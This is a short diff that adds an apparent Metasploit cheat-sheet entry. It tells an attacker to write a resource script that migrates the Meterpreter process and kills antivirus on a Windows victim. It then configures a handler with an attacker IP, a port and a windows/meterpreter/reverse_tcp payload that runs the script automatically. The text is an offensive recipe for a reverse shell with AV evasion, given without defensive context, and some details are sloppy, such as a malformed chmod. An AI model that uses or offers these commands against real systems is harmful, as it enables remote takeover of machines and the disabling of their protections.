@@ -1,0 +1,14 @@
+# Run auto migrate
+Create a script on attacker machine like below commands:
+
+cat /root/ddos.rc
+run post/windows/manage/migrate
+run post/windows/manage/killav
+
+chmod +x 777 ddos.rc
+
+Set an exploit like this:
+exploit(handler) #>set LHOST 192.168.1.9
+exploit(handler) #>set LPORT 8080
+exploit(handler) #>set PAYLOADS windows/meterpreter/reverse_tcp
+exploit(handler) #>set AutoRunScript multi_console_command -rc /root/ddos.rc
